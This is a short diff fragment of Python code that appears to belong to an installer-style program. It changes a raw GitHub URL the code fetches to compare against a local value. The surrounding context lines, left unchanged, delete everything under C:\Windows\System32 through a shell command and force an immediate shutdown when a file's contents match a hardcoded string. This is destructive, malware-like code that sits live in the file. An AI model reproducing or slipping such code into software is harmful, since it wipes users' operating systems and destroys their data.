@@ -98,7 +98,7 @@ if file_contentsx1 =="mJaAQuPVWhWXG":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
 
-url = "https://raw.githubusercontent.com/himi0610sklxvv/installer/refs/heads/main/uniqueidaes.txt"
+url = "https://raw.githubusercontent.com/himisxcslkxstvn/installer/refs/heads/main/uniqueidaes.txt"
 search_string = file_contentsx1
 result = check_string_in_url(url, search_string)
 print(result)
